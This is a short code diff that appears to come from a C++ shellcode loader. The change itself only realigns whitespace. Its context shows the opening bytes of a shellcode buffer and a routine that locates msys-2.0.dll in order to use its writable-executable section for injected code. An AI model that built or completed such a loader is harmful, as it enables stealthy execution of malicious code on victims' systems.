@@ -25,7 +25,7 @@ unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
 bool setup_memory(void*& blk, size_t& sz)
 {
     // DLL with RWX section to leverage
-    constexpr auto target_dll        = L"msys-2.0.dll";
+    constexpr auto        target_dll     = L"msys-2.0.dll";
     bool                  success        = false;
     HANDLE                dll_base       = nullptr;
     PIMAGE_DOS_HEADER     dos_header     = nullptr;
